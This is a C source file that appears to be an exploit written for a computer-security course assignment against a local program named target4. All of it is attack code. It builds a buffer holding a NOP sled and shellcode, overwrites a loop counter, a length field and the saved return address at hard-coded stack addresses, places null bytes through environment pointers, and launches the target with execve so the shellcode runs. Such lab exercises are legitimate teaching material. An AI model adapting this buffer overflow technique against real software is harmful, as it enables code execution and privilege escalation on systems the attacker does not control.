#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

int main(void)
{
    char *args[3];
    char *env[11];

    uint8_t input[300];
    memset(input, 0x90, sizeof(input));
    memcpy(input, shellcode, sizeof(shellcode) - 1);

    /* buf: 0x40a4fdc0 */
    /* len: 0x40a4fe9c (buf[220]) */
    /* rip: 0x40a4fea8 (buf[232]) */
    /* i  : 0x40a4fe98 (buf[216]) */
    /* i = 0x000000XX, { 0xDC, 0X00 x3 } */
    /* len = 220 */

    /* reset i to 0 */
    input[216] = 0;
    input[217] = 0;
    input[218] = 0;
    input[219] = 0;

    /* set len to 23 (239 - 216) */
    input[220] = 23;
    input[221] = 0;
    input[222] = 0;
    input[223] = 0;

    /* overwrite RA */
    input[232] = 0xc0;
    input[233] = 0xfd;
    input[234] = 0xa4;
    input[235] = 0x40;
    input[236] = 0x00;
    input[237] = 0x00;
    input[238] = 0x00;
    input[239] = 0x00;

    args[0] = TARGET;
    args[1] = (char *) input;
    args[2] = NULL;

    env[0] = (char *) &input[217];
    env[1] = (char *) &input[218];
    env[2] = (char *) &input[219];
    env[3] = (char *) &input[220];
    env[4] = (char *) &input[222];
    env[5] = (char *) &input[223];

    env[6] = (char *) &input[224];
    env[7] = (char *) &input[237];
    env[8] = (char *) &input[238];
    env[9] = (char *) &input[239];
    env[10] = NULL;

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
